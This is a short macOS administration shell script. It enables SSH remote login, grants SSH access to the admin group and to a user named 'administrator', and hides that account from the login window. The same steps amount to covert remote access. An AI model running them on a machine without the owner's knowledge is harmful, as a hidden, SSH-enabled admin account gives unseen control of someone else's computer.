#!/bin/sh

# this will enable SSH
# the admin group is enabled
# a user called administrator is enabled on the last 2 lines and then hidden from the login window

systemsetup -setremotelogin on
dseditgroup -o create -q com.apple.access_ssh
dseditgroup -o edit -a admin -t group com.apple.access_ssh
dseditgroup -o edit -a administrator -t user com.apple.access_ssh
defaults write /Library/Preferences/com.apple.loginwindow HiddenUsersList -array administrator

exit
